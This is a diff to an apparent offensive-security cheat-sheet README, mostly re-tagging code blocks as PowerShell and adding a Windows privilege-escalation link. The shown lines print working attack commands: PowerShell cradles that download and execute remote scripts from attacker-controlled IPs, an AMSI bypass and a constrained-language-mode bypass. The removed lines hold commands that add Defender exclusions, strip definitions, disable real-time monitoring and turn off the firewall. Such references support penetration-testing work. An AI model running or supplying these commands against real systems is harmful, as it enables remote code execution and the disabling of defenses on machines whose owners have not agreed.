@@ -65,6 +65,7 @@ Enjoy creating your own 🦠
 
 # [Windows](#Windows-1)
 - [Mimikatz](#Mimikatz)
+- [Windows_Priviege_Escalation](#Windows_Priviege_Escalation)
 
 
 <br>
@@ -946,31 +947,31 @@ $string = $null}} else {cleanup}}
 
 -  Save the below string to a file as .bat and execute.
 
-```
+```powershell
 powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://ip:port/ps.txt')"
 ```
 <br>
 
 ### Download_file
-```
+```powershell
 (New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
 ```
 <br>
  
 ### Powershell_Cradle
-```
+```powershell
 iex(new-object net.webclient).downloadstring('http://192.168.49.68/<ToolName>.ps1')
 ```
 <br>
 
 ### Constrained_lang_mode
-```
+```powershell
 $ExecutionContext.SessionState.LanguageMode
 ```
 <br>
 
 ### CLM_Bypass
-```
+```powershell
 Installutil.exe /logfile= /LogToConsole=false /U "c:\temp\bypass-clm.exe"
 ```
 <br>
@@ -987,7 +988,7 @@ DisableRestrictedAdmin
 ## Disable_AMSI
  
  ### Method 1:
-```
+```powershell
 (([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
 ```
 <br>
@@ -1145,38 +1146,13 @@ bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local
 
 - [Mimikatz](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)
 
-- ##### Open powershell as Administrator
-```
-start-process powershell -verb runas
-```
-<br>
 
-- ##### Add Defender Exclusion area
-```
-Add-MpPreference -ExclusionPath C:\temp, C:\
-```
-<br>
+### Windows_Privilege_Escalation
 
-- ##### Remove definitions
-```
-C:\Program Files\Windows Defender>.\MpCmdRun.exe -removedefinitions -all
-```
-<br>
-
-- ##### Disable Defender / Firewall
-```powershell
-Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true 
-NetSh Advfirewall set allprofiles state off
-```
-<br>
-<br>
+- [Windows_Priviege_Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
 # Linux
 
-### Useful links:
-
-[Linux Priv esc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- <br>
  
  ### Full TTY
  
